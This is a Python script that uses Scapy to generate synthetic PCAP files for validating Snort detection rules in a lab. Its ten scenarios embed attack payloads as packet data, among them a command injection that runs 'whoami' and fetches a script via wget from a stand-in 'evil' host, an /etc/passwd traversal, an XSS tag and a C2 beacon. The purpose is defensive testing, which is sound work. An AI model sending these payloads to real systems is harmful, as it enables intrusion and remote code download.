#!/usr/bin/env python
"""Generate synthetic but protocol-valid lab PCAPs for Snort replay.

These PCAPs are generated for educational validation only. They are not
production captures. Each scenario contains real Ethernet/IP/TCP/UDP/ICMP
layers so Snort can inspect protocol and payload fields.
"""
from __future__ import annotations

import argparse
import json
from pathlib import Path

from scapy.all import Ether, IP, TCP, UDP, ICMP, DNS, DNSQR, Raw, wrpcap  # type: ignore


CLIENT = "203.0.113.10"
SERVER = "192.168.56.10"
INTERNAL = "192.168.56.20"
EXTERNAL = "198.51.100.20"


def tcp_flow(src: str, dst: str, sport: int, dport: int, payload: bytes):
    """Create a minimal established TCP flow with one client payload packet."""
    seq_c = 1000
    seq_s = 5000
    return [
        Ether() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="S", seq=seq_c),
        Ether() / IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="SA", seq=seq_s, ack=seq_c + 1),
        Ether() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="A", seq=seq_c + 1, ack=seq_s + 1),
        Ether() / IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, flags="PA", seq=seq_c + 1, ack=seq_s + 1) / Raw(load=payload),
        Ether() / IP(src=dst, dst=src) / TCP(sport=dport, dport=sport, flags="A", seq=seq_s + 1, ack=seq_c + 1 + len(payload)),
    ]


def build_packets(name: str):
    if name == "sql_injection":
        return tcp_flow(CLIENT, SERVER, 41001, 80, b"GET /search?q=UNION SELECT HTTP/1.1\r\nHost: lab\r\n\r\n")

    if name == "xss":
        return tcp_flow(CLIENT, SERVER, 41002, 80, b"GET /?q=<script>alert(1)</script> HTTP/1.1\r\nHost: lab\r\n\r\n")

    if name == "command_injection":
        return tcp_flow(CLIENT, SERVER, 41003, 80, b"GET /?cmd=whoami;wget http://evil/p.sh HTTP/1.1\r\nHost: lab\r\n\r\n")

    if name == "directory_traversal":
        return tcp_flow(CLIENT, SERVER, 41004, 80, b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: lab\r\n\r\n")

    if name == "ssh_bruteforce":
        packets = []
        for i in range(8):
            packets.extend(tcp_flow(CLIENT, SERVER, 42000 + i, 22, b"SSH-2.0 repeated login lab packet\r\n"))
        return packets

    if name == "malware_c2":
        packets = []
        for i in range(6):
            packets.extend(tcp_flow(INTERNAL, EXTERNAL, 43000 + i, 80, b"GET /gate.php HTTP/1.1\r\nHost: c2.lab\r\nUser-Agent: lab-beacon\r\n\r\n"))
        return packets

    if name == "port_scan":
        packets = []
        for i, port in enumerate([21, 22, 23, 25, 53, 80, 110, 143, 443, 8080, 8443]):
            packets.append(Ether() / IP(src=CLIENT, dst=SERVER) / TCP(sport=44000 + i, dport=port, flags="S", seq=100 + i))
        return packets

    if name == "dns_tunneling":
        qname = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa.lab.example"
        return [
            Ether() / IP(src=INTERNAL, dst="8.8.8.8") / UDP(sport=53000, dport=53) / DNS(rd=1, qd=DNSQR(qname=qname))
        ]

    if name == "icmp_sweep":
        return [
            Ether() / IP(src=CLIENT, dst=f"192.168.56.{i}") / ICMP(type=8) / Raw(load=b"ICMP echo sweep lab packet")
            for i in range(10, 25)
        ]

    if name == "benign_traffic":
        return tcp_flow(INTERNAL, SERVER, 45000, 80, b"GET /health HTTP/1.1\r\nHost: lab\r\n\r\n")

    raise ValueError(f"Unknown scenario: {name}")


SCENARIOS = [
    "port_scan",
    "ssh_bruteforce",
    "sql_injection",
    "xss",
    "command_injection",
    "directory_traversal",
    "dns_tunneling",
    "icmp_sweep",
    "malware_c2",
    "benign_traffic",
]


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--out", default=Path("tests") / "pcaps" / "generated")
    args = parser.parse_args()

    out_dir = Path(args.out)
    out_dir.mkdir(parents=True, exist_ok=True)

    manifest = []
    for scenario in SCENARIOS:
        packets = build_packets(scenario)
        path = out_dir / f"{scenario}.pcap"
        wrpcap(str(path), packets)
        manifest.append({
            "pcap": str(path),
            "scenario": scenario,
            "synthetic": True,
            "protocol_valid": True,
            "expected_attack_type": scenario,
            "packet_count": len(packets),
        })

    (out_dir / "manifest.json").write_text(json.dumps(manifest, indent=2), encoding="utf-8")
    print(f"Wrote {len(manifest)} protocol-valid synthetic lab PCAP files to {out_dir}")


if __name__ == "__main__":
    main()
